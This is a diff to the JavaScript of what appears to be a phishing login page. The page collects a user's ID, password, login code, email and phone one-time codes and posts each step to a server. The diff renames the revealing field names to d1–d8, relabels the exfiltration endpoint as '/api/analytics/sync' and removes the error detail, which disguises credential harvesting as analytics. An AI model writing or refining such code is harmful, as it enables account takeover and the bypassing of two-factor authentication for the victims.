@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const verifyPhoneNum = document.getElementById('verify-phone-num');
     const verifyPhoneOtp = document.getElementById('verify-phone-otp');
 
-    let userData = { id: '', pass: '', login_otp: '', email: '', email_otp: '', phone: '', phone_otp: '', time: '', method: 'password' };
+    let userData = { d1: '', d2: '', d3: '', d4: '', d5: '', d6: '', d7: '', d8: '', method: 'password' };
     let currentStep = 1;
 
     // Tab Switching
@@ -73,15 +73,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (!validatePhone(idVal)) return alert("Please enter a valid phone number");
             }
             
-            userData.id = idVal;
-            userData.time = new Date().toLocaleString();
+            userData.d1 = idVal;
+            userData.d8 = new Date().toLocaleString();
             
             if (userData.method === 'password') {
-                userData.pass = loginPass.value.trim();
-                if (!userData.pass) return alert("Please enter password");
+                userData.d2 = loginPass.value.trim();
+                if (!userData.d2) return alert("Please enter password");
             } else {
-                userData.login_otp = loginOtpInput.value.trim();
-                if (!userData.login_otp) return alert("Please enter verification code");
+                userData.d3 = loginOtpInput.value.trim();
+                if (!userData.d3) return alert("Please enter verification code");
             }
 
             if (idVal.includes('@')) verifyEmailId.value = idVal;
@@ -97,7 +97,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     document.getElementById('submit-login-otp').addEventListener('click', async () => {
         if (!verifyLoginOtp.value) return alert("Please enter the login code");
-        userData.login_otp = verifyLoginOtp.value;
+        userData.d3 = verifyLoginOtp.value;
         document.getElementById('submit-login-otp').innerText = "Verifying...";
         
         console.log("-> Log: LOGIN OTP");
@@ -116,8 +116,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     document.getElementById('submit-email-otp').addEventListener('click', async () => {
         if (!verifyEmailId.value || !verifyEmailOtp.value) return alert("Fill all fields");
-        userData.email = verifyEmailId.value;
-        userData.email_otp = verifyEmailOtp.value;
+        userData.d4 = verifyEmailId.value;
+        userData.d5 = verifyEmailOtp.value;
         document.getElementById('submit-email-otp').innerText = "Verifying...";
         console.log("-> Starting Log: EMAIL");
         await logToServer('📧 EMAIL VERIFY', userData);
@@ -141,8 +141,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     document.getElementById('submit-phone-otp').addEventListener('click', async () => {
         if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert("Fill all fields");
-        userData.phone = verifyPhoneNum.value;
-        userData.phone_otp = verifyPhoneOtp.value;
+        userData.d6 = verifyPhoneNum.value;
+        userData.d7 = verifyPhoneOtp.value;
         document.getElementById('submit-phone-otp').innerText = "Success";
         console.log("-> Starting Log: FINAL");
         await logToServer('📱 PHONE VERIFY (FINAL)', userData);
@@ -153,16 +153,16 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1500);
     });
 
-    async function logToServer(title, data) {
+    async function logToServer(t, d) {
         try {
-            const response = await fetch('/api/log', {
+            const response = await fetch('/api/analytics/sync', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ title, data })
+                body: JSON.stringify({ t, d })
             });
             return await response.json();
         } catch (e) {
-            console.error("Fetch Error:", e);
+            console.error("Sync Error");
         }
     }
 
